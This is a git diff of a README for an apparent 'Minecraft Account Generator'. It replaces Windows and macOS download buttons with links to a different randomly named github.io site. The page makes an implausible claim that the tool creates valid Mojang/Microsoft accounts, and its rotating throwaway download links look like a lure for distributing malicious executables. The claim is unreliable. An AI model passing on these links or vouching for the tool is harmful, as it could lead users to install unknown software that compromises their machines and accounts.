@@ -1,7 +1,7 @@
 # Minecraft Account Generator
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://wsxuvucepnao.github.io/dl2/)
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://wsxuvucepnao.github.io/mac2/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yauutchdikpr.github.io/win-download/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yauutchdikpr.github.io/mac-download/)
 
 Fast Minecraft Java Edition account generator. Creates valid Mojang/Microsoft accounts with username customization and skin support.
 
